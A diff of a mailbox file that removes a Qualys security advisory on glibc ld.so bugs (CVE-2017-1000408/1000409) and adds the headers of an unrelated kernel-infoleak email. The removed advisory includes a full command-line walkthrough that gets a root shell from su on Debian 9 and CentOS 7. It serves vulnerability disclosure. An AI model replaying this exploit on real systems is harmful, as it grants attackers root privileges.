@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["22455" "Monday" "11" "December" "2017" "11:14:38" "-0800" "Qualys Security Advisory" "qsa@qualys.com" "<20171211191438.GA11125@localhost.localdomain>" "525" "[oss-security] Qualys Security Advisory - Buffer overflow in glibc's ld.so" nil nil nil "12" "2017121119:14:38" "[oss-security] Qualys Security Advisory - Buffer overflow in glibc's ld.so" (number mark "U       qsa@qualys.c Dec 11  525/22455 " thread-indent "\"[oss-security] Qualys Security Advisory - Buffer overflow in glibc's ld.so\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["3440" "Monday" "9" "October" "2017" "11:12:08" "+0200" "Alexander Potapenko" "glider@google.com" "<CAG_fn=WuQgi2dWQesBdAzYEvRGWbLU97qdGMAjiyWkbCEX=bRQ@mail.gmail.com>" "74" "[oss-security] CVE-2017-14991 in the Linux Kernel: local infoleak via an SG_GET_REQUEST_TABLE ioctl call for /dev/sg0" nil nil nil "10" "2017100909:12:08" "[oss-security] CVE-2017-14991 in the Linux Kernel: local infoleak via an SG_GET_REQUEST_TABLE ioctl call for /dev/sg0" (number mark "U       glider@googl Oct  9   74/3440  " thread-indent "\"[oss-security] CVE-2017-14991 in the Linux Kernel: local infoleak via an SG_GET_REQUEST_TABLE ioctl call for /dev/sg0\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 5669 invoked by uid 550); 11 Dec 2017 18:18:40 -0000
+Received: (qmail 15415 invoked by uid 550); 9 Oct 2017 09:12:23 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,564 +12,112 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 5411 invoked from network); 11 Dec 2017 18:17:38 -0000
+Received: (qmail 15394 invoked from network); 9 Oct 2017 09:12:22 -0000
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=qualys.com; s=google;
-        h=date:from:to:subject:message-id:mime-version:content-disposition;
-        bh=rf6CnPaVH4dPBSbFTIeIRQTwbJ20+o1JpjYQ+A0LF0c=;
-        b=jCwov5xWLzbhrdoVWYIQow89uynfQwTwlQhGQF1o8ZoVSWLQbl/gA9YUs/iqfWvTMQ
-         d98kTjfv4Tk8PHma61FZmmjQi2YHiq/PI8lWXmXzXMTUIWz46LtvyR6rmOPsRAANVIHT
-         oCEBAhHUfznwbzWN70wdU39UCAUAGvtZMrGMceGK/eiMsCtRaPSVB+0KPdruGZX9/edx
-         KUg8z4673Y+6MPb0JrP/wrUxx66LpuzFLWU9PsccGB+Vcyoc16uyUEXVZj+P3idd2zoe
-         WxR8QYbOkK3Ki/uUGfKJC9wnk/oZCNT8gRv3tVc/XPxjqk/9g+05EwSHLb/OZDio8yEf
-         kCRA==
+        d=google.com; s=20161025;
+        h=mime-version:from:date:message-id:subject:to;
+        bh=x59oagc8dorc6w4HVRsuxkqcFDtohUG7MNGXMK5csxE=;
+        b=jb8VFZcbvK5Ky+b628cKvne4kz37AyblgaML1shQ+brPh9g/rI+TLjD9koPSbDME04
+         ukS0SWbc6fmYdDQlu2AVbW2Oltj8gHVS6jq6Bd7a/jCdrAz7eCostkJZ3qJTPWSCaWMx
+         HukMsCpK7UXRUNdDlNQh9aNgihSyp19/9LG/+m8WTP1Xl1iP6aoMKrAIFuAKV/AOzjzC
+         DDccMbCy1sOCt22uieOOTsx6HWKFBxHNpFmwHWtwqjdHMTVJo8EYzvaLt3TjCFrrKY0Y
+         taYoCMkD3HbbjB6EWv9K/z5l5sQnCiD++DisMTT/fnoaJJV1kV4OQBlJgcupDZi4DfE8
+         hVYA==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
         d=1e100.net; s=20161025;
-        h=x-gm-message-state:date:from:to:subject:message-id:mime-version
-         :content-disposition;
-        bh=rf6CnPaVH4dPBSbFTIeIRQTwbJ20+o1JpjYQ+A0LF0c=;
-        b=ejd/RPMYphRB5TGtPNqf0EC6VluJfKNsKPczovjfXr4hdImcFOIUba2ZZ/BZ4bbwrV
-         pdGcYWuXQXgsVyVI8vDpO2uXZAPhm0yWgvikUg15aXiV7kp/bjvl2ZO4O8usBfW/uaJ6
-         r3bBV7uudT3EHzpa476i30ekdBTG77d3X2qfbDN2Kvk39DWb7Rzn4R8j1e4PIH5tYMRs
-         LxygO9TB2YwMJiEr8EYOOG3htHyvdhHXtO+tpp1Gwt8/71UF+N9+kOlTXZ5+aKAuUXVl
-         gyrkhPU/yKN7BGuxfUS8ifMiRdd+7FSoJAl6T98LiSA6bEPCSwPyk6jdayMG7WttOePV
-         /sjw==
-X-Gm-Message-State: AKGB3mIowUnuiBTSB5lAfkqZ4IGv0F9xXprxSmoKJlQYB/TppXREzZLh
-	yDeLRM7AdgbvKSvLIE9APAtV4Utv
-X-Google-Smtp-Source: ACJfBovN4XmvAOY7oD55Nn+MuIi1RTqaQD9v4gW2yxz4253wvE+2WcQ3cDAIYeMY2I/urTyJRsnbkA==
-X-Received: by 10.101.70.136 with SMTP id h8mr1068451pgr.325.1513016245769;
-        Mon, 11 Dec 2017 10:17:25 -0800 (PST)
-Date: Mon, 11 Dec 2017 11:14:38 -0800
-From: Qualys Security Advisory <qsa@qualys.com>
-To: oss-security@lists.openwall.com
-Message-ID: <20171211191438.GA11125@localhost.localdomain>
+        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
+        bh=x59oagc8dorc6w4HVRsuxkqcFDtohUG7MNGXMK5csxE=;
+        b=fGZZsTSG5L7HZbsffUKIptQuRNwSi6Ga9EsZwFr8eMcde0IzwevoNX5f02rJT0W1H0
+         llBt4WV6ZNsHwS34SStC/NYVF5Z2bVqtcuJmuPUYxJHmVXjIjEeThekIc2rxqhZI6X3g
+         idy6gZiFNR84p4N5lUmAscipP9gwNmNHmZQCRnZ5zujHIjFC3bWom5FeNxRXyUZV7jYj
+         lSB5i12DXvuPQI/rtUX8MgkzWsNrkuxXTViKGJrVXzSCZKZTOnrPJENNCnY2i3TSNpml
+         hhpcnMooKfQtRwI3P8qYAvL4mL8DBt4IQ1tXX//pZ5LsQ5wF4TFkAoJdCux1ty7BlGui
+         5RwQ==
+X-Gm-Message-State: AMCzsaXrroGNJunuY6h7lbvlzIDxsEXE7RmBMfqWDNiByIFUrCc/uLsF
+	IppGpIJa5IUXcV/BxGZBHekEozMX6DRe/BqTaNuwAttrv5o=
+X-Google-Smtp-Source: AOwi7QAHpZQfcweDPXGvg/nFelLmiTUPbLWQUgg/vh/PxQ3pjwUeSmBTerl5GN6SqDWoHsA1lKLj9oQgQ6MKhl35ikU=
+X-Received: by 10.31.175.205 with SMTP id y196mr4171142vke.35.1507540329762;
+ Mon, 09 Oct 2017 02:12:09 -0700 (PDT)
 MIME-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Content-Disposition: inline
-Subject: [oss-security] Qualys Security Advisory - Buffer overflow in glibc's ld.so
-
-
-Qualys Security Advisory
-
-Buffer overflow in glibc's ld.so
-
-
-========================================================================
-Contents
-========================================================================
-
-Summary
-Memory Leak
-Buffer Overflow
-Exploitation
-Acknowledgments
-
-
-========================================================================
-Summary
-========================================================================
-
-We have discovered a memory leak and a buffer overflow in the dynamic
-loader (ld.so) of the GNU C Library (glibc):
-
-- the memory leak (CVE-2017-1000408) first appeared in glibc 2.1.1
-  (released on May 24, 1999) and can be reached and amplified through
-  the LD_HWCAP_MASK environment variable;
-
-- the buffer overflow (CVE-2017-1000409) first appeared in glibc 2.5
-  (released on September 29, 2006) and can be triggered through the
-  LD_LIBRARY_PATH environment variable.
-
-Further investigation showed that:
-
-- the buffer overflow is not exploitable if
-  /proc/sys/fs/protected_hardlinks is enabled (it is not enabled by
-  default on vanilla Linux kernels, but most Linux distributions turn it
-  on by default);
-
-- the memory leak and the buffer overflow are not exploitable if the
-  glibc is patched against CVE-2017-1000366, because this patch ignores
-  the LD_HWCAP_MASK and LD_LIBRARY_PATH environment variables when SUID
-  binaries are executed (CVE-2017-1000366 was first patched in glibc
-  2.26, released on August 2, 2017, but most Linux distributions had
-  already backported this patch on June 19, 2017).
-
-We have therefore rated the impact of these vulnerabilities as Low.
-Nevertheless, we give a brief analysis of the vulnerable function, and
-present a simple method for exploiting a SUID binary on the command line
-and obtaining full root privileges (if /proc/sys/fs/protected_hardlinks
-is not enabled, and CVE-2017-1000366 is not patched).
-
-
-========================================================================
-Memory Leak (CVE-2017-1000408)
-========================================================================
-
-------------------------------------------------------------------------
-Analysis
-------------------------------------------------------------------------
-
-In _dl_init_paths(), ld.so malloc()ates "rtld_search_dirs.dirs[0]", a
-cache of information about the system's trusted directories (typically
-"/lib" and "/usr/lib" on 32-bit or "/lib64" and "/usr/lib64" on 64-bit).
-To compute the number of system directories, ld.so uses the classic C
-idiom "sizeof (system_dirs) / sizeof (system_dirs[0])":
-
- 691   rtld_search_dirs.dirs[0] = (struct r_search_path_elem *)
- 692     malloc ((sizeof (system_dirs) / sizeof (system_dirs[0]))
- 693             * round_size * sizeof (struct r_search_path_elem));
-
-Unfortunately, "system_dirs" is not a classic array: it is not an array
-of strings (pointers to characters), but rather an array of characters,
-the concatenation of all system directories, separated by null bytes:
-
- 109 static const char system_dirs[] = SYSTEM_DIRS;
-
-where "SYSTEM_DIRS" is generated by "gen-trusted-dirs.awk" (typically
-"/lib/\0/usr/lib/" on 32-bit or "/lib64/\0/usr/lib64/" on 64-bit). As a
-result, the number of system directories is overestimated, and too much
-memory is allocated for "rtld_search_dirs.dirs[0]": if "system_dirs" is
-"/lib/\0/usr/lib/" for example, the number of system directories is 2,
-but 16 is used instead (the number of characters in "system_dirs") to
-compute the size of "rtld_search_dirs.dirs[0]".
-
-This extra memory is never accessed, never freed, and mostly filled with
-null bytes, because only the information about "nsystem_dirs_len" system
-directories (the correct number of system directories) is written to
-"rtld_search_dirs.dirs[0]", and because the minimal malloc()
-implementation in ld.so calls mmap(), but never munmap().
-
-Moreover, this memory leak can be amplified through the LD_HWCAP_MASK
-environment variable, because ld.so uses "ncapstr" (the total number of
-hardware-capability combinations) to compute the size of
-"rtld_search_dirs.dirs[0]":
-
- 687   round_size = ((2 * sizeof (struct r_search_path_elem) - 1
- 688                  + ncapstr * sizeof (enum r_dir_status))
- 689                 / sizeof (struct r_search_path_elem));
-
-------------------------------------------------------------------------
-History
-------------------------------------------------------------------------
-
-We tracked down this vulnerability to:
-
-commit ab7eb292307152e706948a7b19164ff5e6d593d4
-Date:   Mon May 3 21:59:35 1999 +0000
-
-    Update.
-
-        * elf/Makefile (trusted-dirs.st): Use gen-trusted-dirs.awk.
-        * elf/gen-trusted-dirs.awk: New file.
-        * elf/dl-load.c (systems_dirs): Moved into file scope.  Initialize
-        from SYSTEM_DIRS macro.
-        (system_dirs_len): New variable.  Contains lengths of system_dirs
-        strings.
-        (fillin_rpath): Rewrite for systems_dirs being a simple string.
-        Improve string comparisons.  Change parameter trusted to be a flag.
-        Change all callers.
-        (_dt_init_paths): Improve using new format for system_dirs.
-
-which transformed "system_dirs" from an array of strings (pointers to
-characters) into an array of characters:
-
--  static const char *system_dirs[] =
--  {
--#include "trusted-dirs.h"
--    NULL
--  };
-...
-+static const char system_dirs[] = SYSTEM_DIRS;
-
-
-========================================================================
-Buffer Overflow (CVE-2017-1000409)
-========================================================================
-
-------------------------------------------------------------------------
-Analysis
-------------------------------------------------------------------------
-
-In _dl_init_paths(), ld.so computes "nllp", the number of
-colon-separated directories in "llp" (the LD_LIBRARY_PATH environment
-variable), malloc()ates "env_path_list.dirs", an array of "nllp + 1"
-pointers to "r_search_path_elem" structures (one for each directory in
-"llp", plus a terminating NULL pointer), and calls fillin_rpath() to
-fill in "env_path_list.dirs":
-
- 777   if (llp != NULL && *llp != '\0')
- 778     {
- 779       size_t nllp;
- 780       const char *cp = llp;
- 781       char *llp_tmp;
- ...
- 803       nllp = 1;
- 804       while (*cp)
- 805         {
- 806           if (*cp == ':' || *cp == ';')
- 807             ++nllp;
- 808           ++cp;
- 809         }
- 810 
- 811       env_path_list.dirs = (struct r_search_path_elem **)
- 812         malloc ((nllp + 1) * sizeof (struct r_search_path_elem *));
- ...
- 819       (void) fillin_rpath (llp_tmp, env_path_list.dirs, ":;",
- 820                            __libc_enable_secure, "LD_LIBRARY_PATH",
- 821                            NULL, l);
-
-Unfortunately, ld.so parses the "llp" string to compute "nllp" but
-parses the "llp_tmp" string (an expanded copy of "llp") to fill in
-"env_path_list.dirs". As a result, the number of pointers written to
-"env_path_list.dirs" can be greater than "nllp + 1" (an mmap()-based
-buffer overflow) if the contents of "llp_tmp" differ from the contents
-of "llp" (if "llp_tmp" contains more colons than "llp"):
-
- 784       /* Expand DSTs.  */
- 785       size_t cnt = DL_DST_COUNT (llp, 1);
- 786       if (__glibc_likely (cnt == 0))
- 787         llp_tmp = strdupa (llp);
- 788       else
- 789         {
- 790           /* Determine the length of the substituted string.  */
- 791           size_t total = DL_DST_REQUIRED (l, llp, strlen (llp), cnt);
- 792 
- 793           /* Allocate the necessary memory.  */
- 794           llp_tmp = (char *) alloca (total + 1);
- 795           llp_tmp = _dl_dst_substitute (l, llp, llp_tmp, 1);
- 796         }
-
-The Dynamic String Tokens (DSTs) $LIB and $PLATFORM are expanded to
-fixed strings that do not contain colons (typically "lib" and "i686" on
-32-bit or "lib64" and "x86_64" on 64-bit), but the expansion of $ORIGIN
-(the directory of the binary being executed) can inject extra colons
-into "llp_tmp" and hence extra pointers into "env_path_list.dirs".
-
-To exploit this buffer overflow, a local attacker must therefore be able
-to:
-
-- hard-link a SUID binary into a directory whose pathname contains
-  colons (i.e., /proc/sys/fs/protected_hardlinks must not be enabled);
-
-- pass the LD_LIBRARY_PATH environment variable to _dl_init_paths()
-  (i.e., CVE-2017-1000366 must not be patched).
-
-------------------------------------------------------------------------
-History
-------------------------------------------------------------------------
-
-We tracked down this vulnerability to:
-
-commit 950398e1320255572f4228db94344dcd5f613455
-Date:   Tue Aug 29 01:44:27 2006 +0000
-
-    * elf/dl-load.c (_dl_init_paths): Expand DSTs.
-
-which added the expansion of llp's Dynamic String Tokens (DSTs) to
-_dl_init_paths():
-
--      char *llp_tmp = strdupa (llp);
-+      char *llp_tmp;
-...
-+      /* Expand DSTs.  */
-+      size_t cnt = DL_DST_COUNT (llp, 1);
-+      if (__builtin_expect (cnt == 0, 1))
-+       llp_tmp = strdupa (llp);
-+      else
-+       {
-+         /* Determine the length of the substituted string.  */
-+         size_t total = DL_DST_REQUIRED (l, llp, strlen (llp), cnt);
-+
-+         /* Allocate the necessary memory.  */
-+         llp_tmp = (char *) alloca (total + 1);
-+         llp_tmp = _dl_dst_substitute (l, llp, llp_tmp, 1);
-+       }
-
-
-========================================================================
-Exploitation
-========================================================================
-
-------------------------------------------------------------------------
-Debian 9 (i386)
-------------------------------------------------------------------------
-
-In this example, we exploit the SUID-root binary "su" on a 32-bit Debian
-9.0: we installed "debian-9.0.0-i386-xfce-CD-1.iso" (the last release
-before glibc's CVE-2017-1000366 was patched), and manually disabled
-protected_hardlinks ("echo 0 > /proc/sys/fs/protected_hardlinks").
-
-1/ First, we identify the system's trusted directories (the only
-directories accepted by fillin_rpath() when executing a SUID binary):
-
-$ env -i LD_PRELOAD=nonexistent LD_HWCAP_MASK=0 LD_DEBUG=libs env 2>&1 | head
-      1607:     find library=nonexistent [0]; searching
-      1607:      search cache=/etc/ld.so.cache
-      1607:      search path=/lib/i386-linux-gnu/tls/i686:/lib/i386-linux-gnu/tls:/lib/i386-linux-gnu/i686:/lib/i386-linux-gnu:/usr/lib/i386-linux-gnu/tls/i686:/usr/lib/i386-linux-gnu/tls:/usr/lib/i386-linux-gnu/i686:/usr/lib/i386-linux-gnu:/lib/tls/i686:/lib/tls:/lib/i686:/lib:/usr/lib/tls/i686:/usr/lib/tls:/usr/lib/i686:/usr/lib            (system search path)
-      1607:       trying file=/lib/i386-linux-gnu/tls/i686/nonexistent
-      1607:       trying file=/lib/i386-linux-gnu/tls/nonexistent
-      1607:       trying file=/lib/i386-linux-gnu/i686/nonexistent
-      1607:       trying file=/lib/i386-linux-gnu/nonexistent
-      1607:       trying file=/usr/lib/i386-linux-gnu/tls/i686/nonexistent
-      1607:       trying file=/usr/lib/i386-linux-gnu/tls/nonexistent
-      1607:       trying file=/usr/lib/i386-linux-gnu/i686/nonexistent
-
-The "system search path" line shows four system directories:
-"/lib/i386-linux-gnu", "/usr/lib/i386-linux-gnu", "/lib", and "/usr/lib"
-("tls" and "i686" are default hardware capabilities that are enabled
-even if LD_HWCAP_MASK is 0).
-
-2/ Second, we create our $ORIGIN directory and hard-link the SUID-root
-binary "su" into it:
-
-$ mkdir -p '/var/tmp/:/lib:/usr/lib:'
-
-$ cd '/var/tmp/:/lib:/usr/lib:'
-
-$ ln `which su` .
-
-The pathname of our $ORIGIN directory contains two system directories:
-we will write 12 bytes (3 pointers: one for each system directory, plus
-a terminating NULL pointer) to an 8-byte "env_path_list.dirs" ("nllp" is
-only 1, because our unexpanded LD_LIBRARY_PATH does not contain colons).
-In other words, we will overflow "env_path_list.dirs" and write 4 bytes
-(the terminating NULL pointer) out of bounds.
-
-3/ Third, we overwrite this out-of-bounds NULL pointer with the first
-bytes of an error message ("cannot open shared object file") that is
-malloc()ated after "env_path_list.dirs" because of our "nonexistent"
-preload library. Consequently, ld.so crashes when open_path() tries to
-open our second preload library "rootshell.so" in a directory described
-by an "r_search_path_elem" structure located at the unmapped address
-0x6e6e6163 (the overwritten NULL pointer):
-
-$ env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so' ./su
-ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.
-Segmentation fault
-
-$ dmesg | tail -n 1
-[70632.888695] su[2293]: segfault at 6e6e6173 ip b77e1c43 sp bfc946dc error 4 in ld-2.24.so[b77db000+22000]
-
-The "/../../../../../../../../$LIB" suffix is required, to pass the
-"check_for_trusted" test in _dl_dst_substitute() (our expanded
-LD_LIBRARY_PATH must be rooted in one of the system's trusted
-directories).
-
-4/ Next, we copy the library dependencies of "su" to our current working
-directory, and compile our preload library "rootshell.so" ("la.c" can be
-found at the beginning of our stack-clash exploit "Linux_ldso_hwcap.c"):
-
-$ cp -- `ldd ./su | grep ' => /' | awk '{print $3}'` .
-
-$ cat > la.c << "EOF"
-> static void __attribute__ ((constructor)) _init (void) {
->     ...
->     // setuid(0);
->     ...
->     // execve("/bin/sh");
->     ...
-> }
-> EOF
-
-$ gcc -fpic -shared -nostdlib -Os -s -o rootshell.so la.c
-
-$ chmod u+s rootshell.so
-
-This "chmod" is required, to pass the SUID-bit test in open_path().
-
-5/ Last, we run "su" with an increasing number of hardware capabilities
-(i.e., with an increasingly large "rtld_search_dirs.dirs[0]"), until the
-"rtld_search_dirs.dirs[0]" occupies the address 0x6e6e6163. Because this
-"rtld_search_dirs.dirs[0]" is mostly filled with null bytes, and because
-an "r_search_path_elem" structure filled with null bytes is equivalent
-to the current working directory in open_path(), ld.so will eventually
-load and execute our "rootshell.so" from the current working directory:
-
-$ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so' LD_HWCAP_MASK="$(((1<<16)-1))" ./su
-ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.
-Segmentation fault
-
-real    0m0.715s
-user    0m0.120s
-sys     0m0.588s
-
-$ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so' LD_HWCAP_MASK="$(((1<<17)-1))" ./su
-ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.
-Segmentation fault
-
-real    0m1.443s
-user    0m0.368s
-sys     0m1.072s
-
-$ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so' LD_HWCAP_MASK="$(((1<<18)-1))" ./su
-ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.
-Segmentation fault
-
-real    0m2.840s
-user    0m0.656s
-sys     0m2.172s
-
-...
-
-$ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so' LD_HWCAP_MASK="$(((1<<23)-1))" ./su
-ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.
-Segmentation fault
-
-real    0m5.778s
-user    0m1.200s
-sys     0m4.576s
-
-$ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so' LD_HWCAP_MASK="$(((1<<24)-1))" ./su
-ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.
-Segmentation fault
-
-real    0m11.589s
-user    0m2.520s
-sys     0m9.060s
-
-$ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so' LD_HWCAP_MASK="$(((1<<25)-1))" ./su
-ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.
-# id; exit
-uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),1000(user)
-
-real    0m28.050s
-user    0m6.140s
-sys     0m21.892s
-
-6/ Improvements in the running time of this exploit are left as an
-exercise for the interested reader:
-
-$ env -i LD_LIBRARY_PATH=. LD_PRELOAD=nonexistent LD_HWCAP_MASK="$(((1<<25)-1))" LD_DEBUG=libs env 2>&1 | head -c 1000
-      3084:     find library=nonexistent [0]; searching
-      3084:      search path=./tls/i686/fxsr/mmx/clflush/pse36/pat/cmov/mca/pge/mtrr/sep/apic/cx8/mce/pae/msr/tsc/pse/de/vme/fpu:./tls/i686/fxsr/mmx/clflush/pse36/pat/cmov/mca/pge/mtrr/sep/apic/cx8/mce/pae/msr/tsc/pse/de/vme:./tls/i686/fxsr/mmx/clflush/pse36/pat/cmov/mca/pge/mtrr/sep/apic/cx8/mce/pae/msr/tsc/pse/de/fpu:./tls/i686/fxsr/mmx/clflush/pse36/pat/cmov/mca/pge/mtrr/sep/apic/cx8/mce/pae/msr/tsc/pse/de:./tls/i686/fxsr/mmx/clflush/pse36/pat/cmov/mca/pge/mtrr/sep/apic/cx8/mce/pae/msr/tsc/pse/vme/fpu:./tls/i686/fxsr/mmx/clflush/pse36/pat/cmov/mca/pge/mtrr/sep/apic/cx8/mce/pae/msr/tsc/pse/vme:./tls/i686/fxsr/mmx/clflush/pse36/pat/cmov/mca/pge/mtrr/sep/apic/cx8/mce/pae/msr/tsc/pse/fpu:./tls/i686/fxsr/mmx/clflush/pse36/pat/cmov/mca/pge/mtrr/sep/apic/cx8/mce/pae/msr/tsc/pse:./tls/i686/fxsr/mmx/clflush/pse36/pat/cmov/mca/pge/mtrr/sep/apic/cx8/mce/pae/msr/tsc/de/vme/fpu:./tls/i686/fxsr/mmx/clflush/pse36/pat/cmov/mca/pge/mtrr/sep/apic/cx8/mc
-
-$ mkdir -p './tls/i686/fxsr/mmx/clflush/pse36/pat/cmov/mca/pge/mtrr/sep/apic/cx8/mce/pae/msr/tsc/pse/de/vme/fpu'
-
-$ mv -- *.so* './tls/i686/fxsr/mmx/clflush/pse36/pat/cmov/mca/pge/mtrr/sep/apic/cx8/mce/pae/msr/tsc/pse/de/vme/fpu'
-
-$ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so' LD_HWCAP_MASK="$(((1<<25)-1))" ./su
-ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.
-# id; exit
-uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),1000(user)
-
-real    0m23.485s
-user    0m5.244s
-sys     0m18.220s
-
-$ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='os-release:rootshell.so' LD_HWCAP_MASK="$(((1<<25)-1))" ./su
-ERROR: ld.so: object 'os-release' from LD_PRELOAD cannot be preloaded (invalid ELF header): ignored.
-# id; exit
-uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),1000(user)
-
-real    0m11.352s
-user    0m2.844s
-sys     0m8.388s
-
-------------------------------------------------------------------------
-CentOS 7 (i386)
-------------------------------------------------------------------------
-
-In this example, we exploit "su" on a 32-bit CentOS 7.3.1611: we
-installed "CentOS-7-i386-Minimal-1611.iso" (the last release before
-CVE-2017-1000366 was patched), and manually disabled protected_hardlinks
-("echo 0 > /proc/sys/fs/protected_hardlinks").
-
-$ env -i LD_PRELOAD=nonexistent LD_HWCAP_MASK=0 LD_DEBUG=libs env 2>&1 | head
-     17896:     find library=nonexistent [0]; searching
-     17896:      search cache=/etc/ld.so.cache
-     17896:      search path=/lib/tls/i686:/lib/tls:/lib/i686:/lib:/usr/lib/tls/i686:/usr/lib/tls:/usr/lib/i686:/usr/lib                (system search path)
-     17896:       trying file=/lib/tls/i686/nonexistent
-     17896:       trying file=/lib/tls/nonexistent
-     17896:       trying file=/lib/i686/nonexistent
-     17896:       trying file=/lib/nonexistent
-     17896:       trying file=/usr/lib/tls/i686/nonexistent
-     17896:       trying file=/usr/lib/tls/nonexistent
-     17896:       trying file=/usr/lib/i686/nonexistent
-
-$ mkdir -p '/var/tmp/:/lib:/usr/lib:'
-
-$ cd '/var/tmp/:/lib:/usr/lib:'
-
-$ ln `which su` .
-
-$ env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so' ./su
-ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded: ignored.
-Segmentation fault
-
-$ dmesg | tail -n 1
-[ 8414.911000] su[18088]: segfault at 6e6e6173 ip b77645e2 sp bfe0cb40 error 4 in ld-2.17.so[b775f000+1f000]
-
-$ cp -- `ldd ./su | grep ' => /' | awk '{print $3}'` .
-
-$ cat > la.c << "EOF"
-> static void __attribute__ ((constructor)) _init (void) {
->     ...
->     // setuid(0);
->     ...
->     // execve("/bin/sh");
->     ...
-> }
-> EOF
-
-$ gcc -fpic -shared -nostdlib -Os -s -o rootshell.so la.c
-
-$ chmod u+s rootshell.so
-
-$ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so' LD_HWCAP_MASK="$(((1<<16)-1))" ./su
-ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded: ignored.
-Segmentation fault
-
-real    0m0.527s
-user    0m0.085s
-sys     0m0.441s
-
-$ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so' LD_HWCAP_MASK="$(((1<<17)-1))" ./su
-ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded: ignored.
-Segmentation fault
-
-real    0m1.060s
-user    0m0.182s
-sys     0m0.877s
-
-$ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so' LD_HWCAP_MASK="$(((1<<18)-1))" ./su
-ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded: ignored.
-Segmentation fault
-
-real    0m2.093s
-user    0m0.384s
-sys     0m1.702s
-
-...
-
-$ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so' LD_HWCAP_MASK="$(((1<<25)-1))" ./su
-ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded: ignored.
-Segmentation fault
-
-real    0m17.071s
-user    0m2.525s
-sys     0m14.537s
-
-$ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so' LD_HWCAP_MASK="$(((1<<26)-1))" ./su
-ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded: ignored.
-Segmentation fault
-
-real    0m33.926s
-user    0m5.464s
-sys     0m28.429s
-
-$ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so' LD_HWCAP_MASK="$(((1<<27)-1))" ./su
-ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded: ignored.
-sh-4.2# id; exit
-uid=0(root) gid=0(root) groups=0(root),1000(user) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
-
-real    1m30.604s
-user    0m16.169s
-sys     1m14.395s
-
-
-========================================================================
-Acknowledgments
-========================================================================
-
-We thank the members of the linux-distros@openwall list.
-
+From: Alexander Potapenko <glider@google.com>
+Date: Mon, 9 Oct 2017 11:12:08 +0200
